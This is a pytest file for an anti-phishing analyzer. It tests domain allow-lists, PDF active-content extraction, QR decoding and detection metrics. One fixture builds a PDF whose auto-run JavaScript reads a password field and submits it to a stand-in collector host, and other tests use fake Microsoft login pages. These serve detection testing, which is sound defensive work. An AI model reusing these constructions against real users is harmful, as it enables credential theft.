import json
import io

from antiphish.analyzer import Analyzer
from antiphish.config import Limits
from antiphish.domains import import_domains, domain
from antiphish.dataset import metrics, paired_comparison
from antiphish.extractors import extract_pdf


def test_unverified_domain_cannot_bypass_phishing(tmp_path, empty_kb):
    csv=tmp_path/'domains.csv'; csv.write_text('domain\nfake.example.com\ncom\ngithub.io\n*.ru\nexample.com\n',encoding='utf-8')
    result=import_domains(csv,empty_kb.with_suffix('.domains.sqlite'))
    assert result['accepted'] == 1
    assert not result['verified']
    assert domain('bad label.ru')[0] is None
    report=Analyzer(empty_kb).analyze(b'<h1>Microsoft</h1><form action="/collect"><input type=password></form>',name='login.html',base_url='https://fake.example.com/login')
    assert report.verdict.value == 'PHISHING'
    assert report.configuration['domain_context']['matched_exact_hosts'] == ['fake.example.com']
    assert not report.configuration['domain_context']['affects_verdict']


def test_broken_advisory_database_does_not_disable_detector(empty_kb):
    empty_kb.with_suffix('.domains.sqlite').write_bytes(b'broken database')
    report=Analyzer(empty_kb).analyze(b'<h1>Microsoft</h1><form action="/collect"><input type=password></form>',name='login.html',base_url='https://fake.example.net/login')
    assert report.verdict.value == 'PHISHING'
    assert report.configuration['domain_context']['status'] == 'UNAVAILABLE'


def test_compressed_pdf_action_is_inspected_without_execution():
    import pymupdf
    doc=pymupdf.open(); doc.new_page()
    stream=doc.get_new_xref(); doc.update_object(stream,'<<>>')
    doc.update_stream(stream,b'var x=this.getField("password").value; this.submitForm("https://collector.example.net/send")',compress=True)
    action=doc.get_new_xref(); doc.update_object(action,f'<< /S /JavaScript /JS {stream} 0 R >>')
    doc.xref_set_key(doc.pdf_catalog(),'OpenAction',f'{action} 0 R')
    data=doc.tobytes(deflate=True); doc.close()
    result=extract_pdf(data,Limits(),quality=False)
    assert result.fingerprints['pdf_actions'][0]['type'] == 'JavaScript'
    assert result.fingerprints['pdf_actions'][0]['executed'] is False
    assert any(e.code == 'ACTIVE_PAYLOAD_BEHAVIOR' for e in result.evidence)
    assert any(u.host == 'collector.example.net' for u in result.urls)


def test_pdf_plain_text_js_name_does_not_claim_active_action():
    import pymupdf
    doc=pymupdf.open(); page=doc.new_page(); page.insert_text((30,30),'/JavaScript /OpenAction examples in a manual')
    data=doc.tobytes(); doc.close()
    result=extract_pdf(data,Limits(),quality=False)
    assert not result.fingerprints['pdf_actions']
    assert not any(e.code == 'PDF_ACTIVE_CONTENT' for e in result.evidence)


def test_pdf_normal_field_submission_is_not_secret_exfiltration():
    from antiphish.active import script_facts
    facts=script_facts('var x=this.getField("name").value; this.submitForm("https://official.example.net/feedback")','pdf:test')
    assert 'field_read' in facts['features']
    assert 'network_submission' in facts['features']
    assert 'secret_field_read' not in facts['features']


def test_inverted_qr_fallback():
    import cv2
    import numpy as np
    from PIL import Image
    from antiphish.qr import decode
    data=cv2.QRCodeEncoder_create().encode('https://qr.example.net/login')
    data=np.pad(data,8,constant_values=255)
    data=cv2.resize(data,None,fx=6,fy=6,interpolation=cv2.INTER_NEAREST)
    assert decode(Image.fromarray(255-data)) == ['https://qr.example.net/login']


def test_failed_cases_remain_in_metric_denominator():
    rows=[{'id':'a','sha256':'a','label':'phishing','group_id':'a','status':'FAILED','verdict':'NOT_DETECTED'}, {'id':'b','sha256':'b','label':'phishing','group_id':'b','status':'COMPLETE','verdict':'SUSPICIOUS'}, {'id':'c','sha256':'c','label':'benign','group_id':'c','status':'COMPLETE','verdict':'NOT_DETECTED'}]
    result=metrics(rows)
    assert result['review_or_phishing']['recall'] == .5
    assert result['strict_phishing']['recall'] == 0
    assert result['completed_fraction'] == 2/3
    assert result['review_or_phishing']['fpr_wilson95'][1] > 0
    assert paired_comparison(rows,rows)['comparison']['phishing']['cluster_bootstrap95'] == [0,0]


def test_capture_storage_failure_does_not_change_http_availability(monkeypatch, tmp_path):
    from antiphish.capture import inspect_url
    from antiphish.network import FetchResult
    from pathlib import Path
    monkeypatch.setattr('antiphish.capture.safe_http_get', lambda url, limits: FetchResult(b'<title>Example</title>',url,[url],'text/html','200'))
    def failure(self, data):
        raise OSError('Disk unavailable')
    monkeypatch.setattr(Path, 'write_bytes', failure)
    row=inspect_url('https://capture.example.net/',output_dir=tmp_path)
    assert row['status'] == 'FETCHED'
    assert row['capture_status'] == 'FAILED'
    assert 'capture' not in row


def test_dataset_integrity_failure_remains_a_trial(tmp_path, empty_kb):
    import zipfile
    from antiphish.dataset import benchmark_dataset
    path=tmp_path/'dataset.zip'
    rows=[{'id':'bad','path':'a.eml','label':'phishing','sha256':'0'*64},{'id':'good','path':'b.eml','label':'benign'}]
    with zipfile.ZipFile(path,'w') as z:
        z.writestr('a.eml',b'Subject: Bad checksum\n\nBody')
        z.writestr('b.eml',b'Subject: Meeting\n\nMeeting at ten')
        z.writestr('manifest.jsonl',''.join(json.dumps(r)+'\n' for r in rows))
    result=benchmark_dataset(path,Analyzer(empty_kb))
    assert result['metrics']['labelled'] == 2
    assert result['metrics']['statuses'] == {'FAILED':1,'COMPLETE':1}
    assert result['metrics']['review_or_phishing']['fn'] == 1
    assert result['rows'][0]['error'] == 'ValueError: Dataset checksum mismatch'
